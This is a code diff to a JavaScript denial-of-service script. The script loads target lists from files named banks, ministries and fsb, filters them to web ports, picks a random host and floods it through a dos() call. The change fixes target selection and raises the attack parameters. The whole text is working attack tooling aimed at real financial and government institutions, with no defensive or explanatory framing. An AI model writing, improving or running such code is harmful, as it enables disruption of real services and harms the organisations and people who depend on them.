@@ -6,15 +6,15 @@ const fsb = require("./targets/fsb.json");
 
 const jointTargets = [...banks, ...ministries, ...fsb];
 
-const index = Math.floor(Math.random() * (jointTargets.length - 1));
-
 const allowedPorts = [80, 8080, 443];
-const filteredTargets = jointTargets.filter(({ port }) =>
-  allowedPorts.includes(port)
+const filteredTargets = jointTargets.filter(
+  ({ ip_str, port }) => allowedPorts.includes(port) && ip_str !== undefined
 );
+
+const index = Math.floor(Math.random() * (filteredTargets.length - 1));
 
 const { ip_str, port } = filteredTargets[index];
 
 const protocol = port === 443 ? "https://" : "http://";
 
-dos(`${protocol}${ip_str}`, 150, 0);
+dos(`${protocol}${ip_str}`, 200, 500);
